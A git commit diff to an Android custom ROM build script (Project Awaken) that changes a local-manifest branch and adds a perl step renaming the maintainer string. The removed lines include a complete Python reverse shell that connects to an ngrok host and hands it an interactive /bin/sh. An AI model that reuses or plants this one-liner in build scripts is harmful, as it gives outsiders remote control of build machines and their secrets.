ee2ac5b143cfb99e4d23212954e94a9ae9eee09e
j0ok34n <103942268+j0ok34n@users.noreply.github.com>
2022-07-07 02:12:39 +0700

    Update build_rom.sh

--- build_rom.sh
+++ build_rom.sh
@@ -1,11 +1,12 @@
 # sync rom
 repo init --depth=1 --no-repo-verify -u https://github.com/Project-Awaken/android_manifest -b 12.1 -g default,-mips,-darwin,-notdefault
-git clone https://github.com/j0ok34n/local_manifests.git --depth 1 -b awaken .repo/local_manifests
+git clone https://github.com/j0ok34n/local_manifests.git --depth 1 -b awaken-local .repo/local_manifests
 repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j8
 
 # build rom
 source build/envsetup.sh
-python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ap.ngrok.io",14297));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+cp packages/apps/Settings/res/values/awaken_strings.xml ../awaken_strings.xml
+perl -pe 's/Unofficial Maintainer/"Công Vĩnh"/g' ../awaken_strings.xml > packages/apps/Settings/res/values/awaken_strings.xml
 export TZ=Asia/Ho_Chi_Minh
 lunch awaken_flashlmdd-userdebug
 make bacon
